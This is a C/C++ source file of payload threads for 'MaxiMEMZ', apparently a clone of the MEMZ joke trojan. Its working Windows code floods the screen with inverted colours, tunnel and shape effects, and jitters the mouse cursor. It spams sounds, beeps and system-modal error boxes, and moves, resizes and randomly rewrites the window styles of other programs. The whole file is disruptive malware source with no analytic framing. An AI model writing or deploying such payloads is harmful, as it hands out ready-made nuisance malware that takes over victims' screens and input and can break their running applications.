#pragma once
#include "maximemz.h"

DWORD WINAPI ColorRadius(LPVOID lpDwordVoid) {
	HDC hdc = GetDC(NULL);
	CONST INT screenWidth = GetSystemMetrics(SM_CXSCREEN);
	CONST INT screenHeight = GetSystemMetrics(SM_CYSCREEN);

	while (TRUE) {
		hdc = GetDC(NULL);
		INT radius = 100;

		INT randomx = rand() % screenWidth;
		INT randomy = rand() % screenHeight;

		for (INT i = 0; i < screenWidth + screenHeight; i++) {
			INT x = radius + i * cos(i + radius * 3) + randomx;
			INT y = radius + i * sin(i + radius * 3) + randomy;
			HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 245, rand() % 237, rand() % 278));
			SelectObject(hdc, hBrush);

			BitBlt(hdc, x, y, 10, 10, hdc, 0, 0, PATINVERT);
			DeleteObject(hBrush);
			Sleep(5);
		}
		ReleaseDC(NULL, hdc);
	}
	return 0x00;
}

DWORD WINAPI PlaySystemSounds(LPVOID lpDwordVoid) {
	while (TRUE) {
		PlaySoundA(cstSystemSounds[rand() % cstSoundLength], GetModuleHandle(NULL), SND_SYNC);
		Sleep(rand() % 10);
		PlaySoundA(cstSystemSounds[rand() % cstSoundLength], GetModuleHandle(NULL), SND_ASYNC);
		Sleep(rand() % 20);
	}
	return 0x00;
}

DWORD WINAPI MessColors(LPVOID lpDwordVoid) {
	HDC hdc = GetDC(NULL);
	CONST INT screenWidth = GetSystemMetrics(SM_CXSCREEN);
	CONST INT screenHeight = GetSystemMetrics(SM_CYSCREEN);

	while (TRUE) {
		hdc = GetDC(NULL);
		BitBlt(hdc, 0, 0, screenWidth, screenHeight, hdc, 0, 0, PATINVERT);
		ReleaseDC(NULL, hdc);
		Sleep(2000);
	}
	return 0x00;
}

DWORD WINAPI ShakeCursor(LPVOID lpDwordVoid) {
	POINT pCursor;
	while (TRUE) {
		GetCursorPos(&pCursor);
		INT shakeX = pCursor.x + rand() % 3 - 1;
		INT shakeY = pCursor.y + rand() % 3 - 1;

		SetCursorPos(shakeX, shakeY);
		Sleep(10);
	}
	return 0x01;
}

DWORD WINAPI MessageThread(LPVOID lpDwordVoid) {
	MessageBoxA(NULL, (LPCSTR)cMessages[rand() % cstMessagesLength], "MaxiMEMZ", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	return 0x00;
}

DWORD WINAPI MessageSpamThread(LPVOID lpDwordVoid) {
	while (TRUE) {
		CreateThread(NULL, 0, MessageThread, 0, NULL, NULL);
		Sleep(rand() % 5000 + 10000);
	}
	return 0x00;
}

// Using MoveWindow is so fishy- //
BOOL WINAPI EnumWindowProc(HWND hWindow, LPARAM longPtr) {
	DWORD dwWindowPid = 0;
	GetWindowThreadProcessId(hWindow, &dwWindowPid);

	// Skip windows from this process //
	if (dwWindowPid == GetCurrentProcessId())
		return TRUE;

	// Scramble window styles //
	if (rand() % 1000 == 0) {
		SetWindowLong(hWindow, GWL_STYLE, rand());
		SetWindowLong(hWindow, GWL_EXSTYLE, rand());
	}

	// Jitter the window size //
	if (rand() % 10 == 0) {
		RECT rect;
		if (GetWindowRect(hWindow, &rect)) {
			MapWindowPoints(HWND_DESKTOP, GetParent(hWindow), (LPPOINT)&rect, 2);

			int dx1 = (rand() % 9) - 4;
			int dy1 = (rand() % 9) - 4;
			int dx2 = (rand() % 9) - 4;
			int dy2 = (rand() % 9) - 4;

			rect.left += dx1;
			rect.top += dy1;
			rect.right += dx2;
			rect.bottom += dy2;

			// Shitty int name //
			int nWidth = max(1, rect.right - rect.left);
			int nHeight = max(1, rect.bottom - rect.top);

			// Move the window, No shit sherlo- //
			MoveWindow(hWindow, rect.left, rect.top, nWidth, nHeight, TRUE);
			Sleep(rand() % 100);
		}
	}

	return TRUE;
}

DWORD WINAPI WindowMoveThread(LPVOID lpDwordVoid) {
	while (TRUE) {
		EnumChildWindows(GetDesktopWindow(), EnumWindowProc, NULL);
		Sleep(100);
	}
	return TRUE;
}

DWORD WINAPI ColorBalls(LPVOID lpDwordVoid) {
	HDC hdc = GetDC(NULL);
	CONST INT screenWidth = GetSystemMetrics(SM_CXSCREEN);
	CONST INT screenHeight = GetSystemMetrics(SM_CYSCREEN);

	while (TRUE) {
		HDC hdc = GetDC(NULL);
		INT randomx = rand() % screenWidth;
		INT randomy = rand() % screenHeight;

		INT topx = 0 + randomx;
		INT topy = 0 + randomy;

		INT bottomx = 50 + randomx;
		INT bottomy = 50 + randomy;

		HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, hBrush);

		Ellipse(hdc, topx, topy, bottomx, bottomy);
		ReleaseDC(NULL, hdc);
		DeleteObject(hBrush);

		Sleep(rand() % 1000);
	}
	return 0x00;
}

DWORD WINAPI TunnelEffect(LPVOID lpDwordVoid) {
	HDC hdc = GetDC(NULL);
	CONST INT screenWidth = GetSystemMetrics(SM_CXSCREEN);
	CONST INT screenHeight = GetSystemMetrics(SM_CYSCREEN);

	while (TRUE) {
		HDC hdc = GetDC(NULL);
		StretchBlt(hdc, 50, 50, screenWidth - 100, screenHeight - 100, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		Sleep(rand() % 2000);
	}
	return 0x00;
}

DWORD WINAPI BeepThread(LPVOID lpDwordVoid) {
	while (TRUE) {
		Beep(rand() % 2555, rand() % 225);
	}
	return 0x00;
}